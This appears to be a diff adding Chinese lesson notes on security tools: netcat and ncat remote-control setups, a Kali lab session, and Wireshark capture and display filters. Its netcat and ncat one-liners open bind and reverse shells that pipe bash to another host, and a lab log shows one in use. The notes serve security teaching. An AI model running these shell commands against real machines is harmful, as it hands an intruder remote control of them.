@@ -1,0 +1,95 @@
+课时12 基本工具-远程控制、NCAT、WIRESHARK、WIRESHARK-筛选器、常见协议
+NC-----远程控制
+正向：
+    A: n  -lp 333 -  bash
+    B: n  1.1.1.1 333
+反向：
+    A: nc -lp 333
+    B: nc 1.1.1.1 333 -c bash
+
+注：Windows用户把bash改成cmd;
+
+
+root@kali:~# ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:0c:29:c6:89:56  
+          inet addr:192.168.198.130  Bcast:192.168.198.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:fec6:8956/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:46 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:49 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:6770 (6.6 KiB)  TX bytes:8161 (7.9 KiB)
+          Interrupt:19 Base address:0x2000 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:20 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:20 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:1200 (1.1 KiB)  TX bytes:1200 (1.1 KiB)
+
+
+A:
+root@kali:~# nc -nv 192.168.1.115 333 -c bash 
+(UNKNOWN) [192.168.1.115] 333 (?) open
+ls 
+pwd
+没有任何反应
+
+B:
+root:~# nc -lp 333
+ls
+Desktop
+/root
+ifconfig
+......(一串文字）
+
+请求来控制我！
+
+NC-----NCAT
+  Nc缺乏就加密和身份验证的能力
+  Ncat包含于nmap工具包中
+  A: ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl
+  B: ncat -nv 1.1.1.1 333 --ssl
+
+不同系统/平台的nc参数功能不尽相同
+
+root:~# man nc
+root:~# nc -h
+
+WIRESHARK
+  抓包嗅探协议分析
+  安全专家必备技能
+  抓包引擎
+    Libpcap9-----Linux
+    Winpcap10-----Windows
+  解码能力
+
+WIRESHARK-----基本使用方法
+  启动
+  选择抓包网卡
+  混杂模式
+  实时抓包
+  保存和分析捕获文件
+  首选项
+
+√ use promiscuous mode all interfaces
+
+wrieshark/tmpdump/...-pcap
+
+WIRESHARK-----筛选器
+  过滤掉干扰的数据包
+  抓包筛选器
+  显示筛选器
+
+          Display Filters
+                ↑
+          Capture Engine
+                ↑
+          Capture Filters
+                ↑
+             Neterwork
+
+(udp) && !(ip.addr==192.468.1.118)
